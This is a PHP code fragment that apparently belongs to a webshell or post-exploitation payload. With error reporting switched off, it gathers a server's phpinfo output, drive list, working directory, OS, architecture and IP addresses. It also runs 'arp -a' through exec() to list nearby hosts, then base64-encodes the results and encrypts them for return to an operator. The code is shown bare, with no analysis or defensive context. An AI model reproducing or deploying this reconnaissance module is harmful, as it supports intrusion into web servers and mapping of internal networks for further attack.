error_reporting(0);
function main($whatever) {
    $result = array();
    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
    $driveList ="";
    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
    {
        for($i=65;$i<=90;$i++)
    	{
    		$drive=chr($i).':/';
    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
    	}
    }
	else
	{
		$driveList="/";
	}
    $currentPath=getcwd();
    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
    $osInfo=PHP_OS;
    $arch="64";
    if (PHP_INT_SIZE == 4) {
        $arch = "32";
    }
    $localIp=gethostbyname(gethostname());
    if ($localIp!=$_SERVER['SERVER_ADDR'])
    {
        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
    }
    $extraIps=getInnerIP();
    foreach($extraIps as $ip)
    {
        if (strpos($localIp,$ip)===false)
        {
         $localIp=$localIp." ".$ip;
        }
    }
    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
    //echo json_encode($result);
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(json_encode($basicInfoObj));
    //echo json_encode($result);
    //echo openssl_encrypt(json_encode($result), "AES128", $key);
    echo encrypt(json_encode($result));
}
function getInnerIP()
{
$result = array();

if (is_callable("exec"))
{
    $result = array();
    exec('arp -a',$sa);
    foreach($sa as $s)
    {
        if (strpos($s,'---')!==false)
		{
			$parts=explode(' ',$s);
			$ip=$parts[1];
			array_push($result,$ip);
		}
		//var_dump(explode(' ',$s));
           // array_push($result,explode(' ',$s)[1]);
    }

}

return $result;
}



